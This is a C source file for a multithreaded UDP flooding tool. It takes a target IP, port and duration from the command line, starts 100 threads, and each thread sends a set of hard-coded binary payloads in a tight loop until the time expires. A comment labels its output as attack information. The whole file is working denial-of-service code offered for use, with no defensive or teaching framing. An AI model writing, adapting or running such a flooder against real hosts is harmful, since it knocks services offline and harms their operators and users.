#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

// Define the number of threads
#define NUM_THREADS 100 // Change this value to adjust the number of threads

// Function to display usage information
void usage() {
    printf("Usage: ./packet_sender ip port time\n");
    exit(1);
}

// Structure to pass data to each thread
struct thread_data {
    char *ip;
    int port;
    int time;
};

// Function that each thread will execute to send packets
void *send_packets(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    // Example binary payloads (byte arrays)
    unsigned char payloads[][16] = {
        {0x1c, 0x2e, 0x19, 0x1d, 0x37, 0xda, 0x95, 0x08, 0x29, 0x81, 0xce, 0x2c, 0x64, 0xc6, 0x00, 0x00},
    {0x4e, 0xc2, 0xcd, 0x61, 0x9c, 0x7e, 0xe0, 0x50, 0xda, 0xfa, 0x52, 0x5d, 0x00, 0x00, 0x00, 0x00},
    {0xae, 0x90, 0x50, 0x1d, 0xb1, 0x05, 0x62, 0x7a, 0x17, 0x9e, 0x4e, 0xe9, 0x00, 0x00, 0x00, 0x00},
    {0xe3, 0x47, 0x05, 0x97, 0x24, 0x89, 0x84, 0xf6, 0x20, 0x7f, 0x2f, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x07, 0x5f, 0x7f, 0x30, 0x11, 0xa4, 0x7d, 0xba, 0x57, 0xa5, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x9d, 0x8e, 0x1f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0xb0, 0x29, 0x0e, 0x90, 0xf5, 0x5b, 0x09, 0x0c, 0x23, 0xbf, 0x42, 0xbe, 0x6b, 0x00, 0x00, 0x00},
    {0xc4, 0x9c, 0xdf, 0xf9, 0x09, 0xf0, 0x82, 0x7e, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0xec, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0xce, 0xe0, 0xcd, 0x92, 0xda, 0xb5, 0x5f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    };

    // Number of payloads
    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);

    // Create UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Setup server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    // Calculate end time for the thread
    endtime = time(NULL) + data->time;

    // Keep sending packets until the specified time expires
    while (time(NULL) <= endtime) {
        for (int i = 0; i < num_payloads; i++) {
            if (sendto(sock, payloads[i], sizeof(payloads[i]), 0, 
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    // Close the socket after sending is done
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    // Parse the command-line arguments
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);

    // Allocate memory for thread IDs
    pthread_t thread_ids[NUM_THREADS];
    struct thread_data data = {ip, port, time};

    // Print attack information
    printf("Sending packets to %s:%d for %d seconds with %d threads\n", ip, port, time, NUM_THREADS);

    // Create threads for sending packets
    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&thread_ids[i], NULL, send_packets, (void *)&data) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        printf("Thread %lu created.\n", thread_ids[i]);
    }

    // Wait for all threads to finish
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    // Print completion message
    printf("Packet sending finished.\n");
    return 0;
}
